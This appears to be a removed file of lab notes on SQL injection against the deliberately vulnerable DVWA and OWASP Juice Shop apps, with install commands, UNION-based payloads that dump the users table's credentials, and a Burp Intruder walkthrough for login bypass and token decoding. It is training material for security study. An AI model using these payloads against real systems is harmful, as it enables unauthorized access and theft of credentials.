@@ -1,82 +1,0 @@
-sudo apt update
-sudo apt install dvwa –y
-sudo service apache2 startsudo service mysql start
-sudo nano /etc/dvwa/config.inc.php
-
-Ensure:$_DVWA['db_password'] = '';Save and exit.http://127.0.0.1/dvwa
-Login:o Username: admino Password: password
-
-Step 5: Set Security Level Go to DVWA Security Set Security Level = Low Click Submit
-
-1' OR '1'='1
-
-1' ORDER BY 1-- -1' ORDER BY 2-- -1' ORDER BY 3-- -
-
-1' UNION SELECT 1,2-- -
-
-1' UNION SELECT database(),2-- -
-
-1' UNION SELECT table_name,2FROM information_schema.tablesWHERE table_schema=database()-- -
-
-1' UNION SELECT column_name,2FROM information_schema.columnsWHERE table_name='users'-- -
-
-1' UNION SELECT user,password FROM users-- -
-
-
-Docker
-------
-sudo apt update
-sudo apt install docker.io –y
-sudo systemctl start docker
-sudo systemctl enable docker
-sudo usermod -aG docker $USER
-Restart the session (important):reboot
-
-docker run hello-world
-docker pull bkimminich/juice-shop
-docker run -d -p 3000:3000 bkimminich/juice-shop
-http://localhost:3000
-
-
-STEP 1: Open Burp SuiteOpen terminal:Burpsuite
-
-Select Temporary Project
-Click Start Burp
-
-STEP 2: Open Burp BrowserIn Burp:Go to Proxy tabClick “Open Browser”
-
-Open Juice Shop WebsiteIn Burp browser, open:https://juice-shop.herokuapp.com/#/loginOR (local):http://localhost:3000/#/login
-
-STEP 4: Enter Dummy Login DetailsEnter any random values:Email: adminPassword: passwordClick Login
-
-STEP 5: Capture Request in BurpNow go to Burp:Click HTTP HistoryLook for:/rest/user/loginThis is the login req
-
-STEP 6: Send Request to Intruder• Right-click on /rest/user/login• Click:Send to Intruder
-
-STEP 7: Configure Intruder AttackGo to:Intruder tab
-1. Positions Tab• Click Clear §• Select email value:
-Example:"email":"admin"• Click Add §Now it becomes:"email":"§admin§"
-
-
-
-STEP 8: Add SQL PayloadsGo to:Payloads tab
-
-Open the website: https://github.com/Ninja-Yubaraj/SQL-Injection-Payloads-Listcopy and paste from: Generic SQL Injection Payloads SectionAfter unchecking URL encoderNow paste SQL injection payloads.Example Payload List:' OR 1=1 --' OR '1'='1admin' --' OR 1=1#' OR ''='
-
-
-STEP 9: Disable URL EncodingVery important:• Uncheck:URL Encode these characters
-STEP 10: Start AttackClick:Start Attack
-
-STEP 11: Analyze ResultsYou will see many responses.Focus on:• Status Code = 200 ✅ (Success)• Other codes = Failed
-
-
-STEP 12: Extract Authentication TokenClick the 200 responseGo to:Response tabLook for:authentication tokenCopy it
-
-
-STEP 13: Decode TokenGo to:Decoder tab1. Paste token2. Select:Decode as → Base64
-Password purpose: Use online MD5 decoder
-
-STEP 14: Get CredentialsAfter decoding, you will see:email: admin@juice-sh.oppassword: admin123These are extracted credentialsSTEP 15: Login Using Extracted DataGo back to Juice Shop:Enter:• Email• Password (decoded one)Click LoginSuccessfully logged in
-
-TYPES OF SQL INJECTION USED HERE1. Authentication Bypass' OR 1=1 --2. Boolean-Based (Blind)' AND 1=1 --' AND 1=2 –
-
